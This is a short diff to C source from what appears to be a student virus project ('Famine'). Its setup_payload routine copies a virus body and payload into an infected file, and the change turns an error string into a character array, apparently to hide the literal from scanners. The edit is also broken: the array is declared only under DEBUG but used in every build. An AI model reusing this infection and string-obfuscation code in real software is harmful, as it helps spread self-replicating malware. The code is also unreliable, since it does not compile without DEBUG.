@@ -6,7 +6,7 @@
 /*   By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/05/11 00:10:33 by agrumbac          #+#    #+#             */
-/*   Updated: 2019/06/07 10:16:42 by agrumbac         ###   ########.fr       */
+/*   Updated: 2019/06/07 11:57:21 by agrumbac         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -103,8 +103,11 @@ bool		setup_payload(const struct entry *original_entry, \
 	void	*constants_location  = safe(payload_off + CALL_INSTR_SIZE, sizeof(constants));
 	void	*virus_location      = safe(virus_off, virus_size);
 
+#ifdef DEBUG
+	char	e[] = {'w','i','l','d','l','y',' ','u','n','r','e','a','s','o','n','a','b','l','e','\0'};
+#endif
 	if (!payload_location || !constants_location || !virus_location)
-		return errors(ERR_CORRUPT, "wildly unreasonable\nsetup_payload");
+		return errors(ERR_CORRUPT, e);
 
 	ft_memcpy(payload_location, (void *)famine_entry, payload_size);
 	ft_memcpy(constants_location, &constants, sizeof(constants));
